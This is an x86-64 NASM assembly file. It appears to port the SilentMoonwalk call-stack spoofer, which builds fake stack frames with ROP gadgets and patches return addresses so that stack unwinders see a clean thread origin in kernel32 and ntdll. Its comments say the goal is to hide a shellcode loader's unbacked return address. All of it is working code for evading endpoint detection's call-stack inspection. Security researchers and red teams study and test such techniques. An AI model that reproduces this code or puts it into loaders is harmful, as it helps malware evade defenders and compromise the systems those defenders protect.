;   ------------------------------------------------------------------------------------
;   SilentMoonwalk desync call-stack spoofer
;
;   Direct NASM translation of SilentMoonwalk/SilentMoonwalk/include/asm/
;   DesyncSpoofer.asm. The SPOOFER layout is kept in sync with Spoof.h.
;   ------------------------------------------------------------------------------------

[BITS 64]

section .text

%define SMW_KERNELBASE                0x00
%define SMW_KERNELBASE_END            0x08
%define SMW_RTLUSER                   0x10
%define SMW_BASETHREAD                0x18
%define SMW_FIRSTFRAME                0x20
%define SMW_SECONDFRAME               0x28
%define SMW_JMPRBX_GADGET             0x30
%define SMW_ADDRSP_GADGET             0x38
%define SMW_FIRSTFRAME_SIZE           0x40
%define SMW_FIRSTFRAME_RAND           0x48
%define SMW_SECONDFRAME_SIZE          0x50
%define SMW_SECONDFRAME_RAND          0x58
%define SMW_JMPRBX_FRAME_SIZE         0x60
%define SMW_ADDRSP_FRAME_SIZE         0x68
%define SMW_RTLUSER_FRAME_SIZE        0x70
%define SMW_BASETHREAD_FRAME_SIZE     0x78
%define SMW_RBP_PUSH_OFFSET           0x80
%define SMW_JMPRBX_GADGET_REF         0x88
%define SMW_SPOOF_FUNC                0x90
%define SMW_RETURN_ADDR               0x98
%define SMW_NARGS                     0xA0
%define SMW_ARG01                     0xA8
%define SMW_ARG02                     0xB0
%define SMW_ARG03                     0xB8
%define SMW_ARG04                     0xC0
%define SMW_ARG05                     0xC8
%define SMW_ARG06                     0xD0
%define SMW_ARG07                     0xD8
%define SMW_ARG08                     0xE0

global silentmoonwalk_spoof_call

silentmoonwalk_spoof_call:
    ;   Saving non-vol registers
    mov     [rsp + 0x08], rbp
    mov     [rsp + 0x10], rbx

    ;   Creating a stack reference to the JMP RBX gadget
    mov     rbx, [rcx + SMW_JMPRBX_GADGET]
    mov     [rsp + 0x18], rbx
    mov     rbx, rsp
    add     rbx, 0x18
    mov     [rcx + SMW_JMPRBX_GADGET_REF], rbx

    ;   Prolog
    ;   RBP -> Keeps track of original Stack
    ;   RSP -> Desync Stack for Unwinding Info
    mov     rbp, rsp

    ;   Point SMW_RETURN_ADDR at [rbp] so the unwinder reads the real-stack
    ;   slot we patch below instead of the unbacked caller return address.
    mov     rax, rbp
    mov     [rcx + SMW_RETURN_ADDR], rax

    ;   Stash the original caller return address in the spare shadow slot so
    ;   restore can still return to the loader after the spoofed call.
    mov     rax, [rbp]
    mov     [rbp + 0x20], rax

    ;   Overwrite the unbacked caller return address with a backed thread-root
    ;   return address (kernel32!BaseThreadInitThunk + 0x14) so the stack walk
    ;   terminates in kernel32 instead of aborting on the shellcode address.
    mov     rax, [rcx + SMW_BASETHREAD]
    add     rax, 0x14
    mov     [rbp], rax

    ;   Creating stack pointer to Restore
    lea     rax, [rel restore]
    push    rax

    ;   RBX contains the stack pointer to Restore
    lea     rbx, [rsp]

    ;   First Frame (Fake origin)
    push    qword [rcx + SMW_FIRSTFRAME]
    mov     rax, [rcx + SMW_FIRSTFRAME_RAND]
    add     qword [rsp], rax

    mov     rax, [rcx + SMW_RETURN_ADDR]
    sub     rax, [rcx + SMW_FIRSTFRAME_SIZE]

    sub     rsp, [rcx + SMW_SECONDFRAME_SIZE]
    mov     r10, [rcx + SMW_RBP_PUSH_OFFSET]
    mov     [rsp + r10], rax

    ;   ROP Frames
    push    qword [rcx + SMW_SECONDFRAME]
    mov     rax, [rcx + SMW_SECONDFRAME_RAND]
    add     qword [rsp], rax

    ;   1. JMP [RBX] Gadget
    sub     rsp, [rcx + SMW_JMPRBX_FRAME_SIZE]
    push    qword [rcx + SMW_JMPRBX_GADGET_REF]
    sub     rsp, [rcx + SMW_ADDRSP_FRAME_SIZE]
    mov     r10, [rcx + SMW_JMPRBX_GADGET]
    mov     [rsp + 0x38], r10

    ;   2. Stack PIVOT (To restore original Control Flow Stack)
    push    qword [rcx + SMW_ADDRSP_GADGET]

    ;   Store the AddRspX gadget frame size on the real stack; the unwinder
    ;   reads it when walking the JMP [RBX] gadget frame so it lands back on
    ;   the real thread-origin frames instead of the desync stack.
    mov     rax, [rcx + SMW_ADDRSP_FRAME_SIZE]
    mov     [rbp + 0x28], rax

    ;   Synthesise the thread-root frames above the patched return address so
    ;   the unwinder can walk BaseThreadInitThunk -> RtlUserThreadStart -> 0
    ;   instead of reading raw stack pointers from the loader's real frame.
    mov     r10, [rcx + SMW_BASETHREAD_FRAME_SIZE]
    test    r10, r10
    jz      .skip_thread_root
    mov     r11, [rcx + SMW_RTLUSER_FRAME_SIZE]
    test    r11, r11
    jz      .skip_thread_root
    mov     rax, [rcx + SMW_RTLUSER]
    test    rax, rax
    jz      .skip_thread_root

    ;   BaseThreadInitThunk's parent return address = RtlUserThreadStart + 0x21
    add     rax, 0x21
    mov     r9, r10
    add     r9, 0x08
    mov     [rbp + r9], rax

    ;   RtlUserThreadStart's parent return address = 0 (thread root)
    mov     r9, r10
    add     r9, r11
    add     r9, 0x10
    mov     qword [rbp + r9], 0

.skip_thread_root:

    ;   Set the pointer to the function to call in RAX
    mov     rax, [rcx + SMW_SPOOF_FUNC]
    jmp     parameter_handler
    jmp     execute

restore:
    mov     rsp, rbp
    mov     rbp, [rsp + 0x08]
    mov     rbx, [rsp + 0x10]

    ;   Put the original caller return address back before returning so the
    ;   loader resumes where silentmoonwalk_spoof_call was invoked.
    mov     r10, [rsp + 0x20]
    mov     [rsp], r10
    ret

parameter_handler:
    mov     r9, rax
    mov     rax, 8
    mov     r8, [rcx + SMW_NARGS]
    mul     r8
    xchg    r9, rax
    cmp     qword [rcx + SMW_NARGS], 8
    je      handle_eight
    cmp     qword [rcx + SMW_NARGS], 7
    je      handle_seven
    cmp     qword [rcx + SMW_NARGS], 6
    je      handle_six
    cmp     qword [rcx + SMW_NARGS], 5
    je      handle_five
    cmp     qword [rcx + SMW_NARGS], 4
    je      handle_four
    cmp     qword [rcx + SMW_NARGS], 3
    je      handle_three
    cmp     qword [rcx + SMW_NARGS], 2
    je      handle_two
    cmp     qword [rcx + SMW_NARGS], 1
    je      handle_one
    cmp     qword [rcx + SMW_NARGS], 0
    je      handle_none
    jmp     handle_none

handle_eight:
    push    r15
    mov     r15, [rcx + SMW_ARG08]
    mov     [rsp + 0x48], r15
    pop     r15
    jmp     handle_seven

handle_seven:
    push    r15
    mov     r15, [rcx + SMW_ARG07]
    mov     [rsp + 0x40], r15
    pop     r15
    jmp     handle_six

handle_six:
    push    r15
    mov     r15, [rcx + SMW_ARG06]
    mov     [rsp + 0x38], r15
    pop     r15
    jmp     handle_five

handle_five:
    push    r15
    mov     r15, [rcx + SMW_ARG05]
    mov     [rsp + 0x30], r15
    pop     r15
    jmp     handle_four

handle_four:
    mov     r9, [rcx + SMW_ARG04]
    jmp     handle_three

handle_three:
    mov     r8, [rcx + SMW_ARG03]
    jmp     handle_two

handle_two:
    mov     rdx, [rcx + SMW_ARG02]
    jmp     handle_one

handle_one:
    mov     rcx, [rcx + SMW_ARG01]
    jmp     handle_none

handle_none:
    jmp     execute

execute:
    jmp     rax
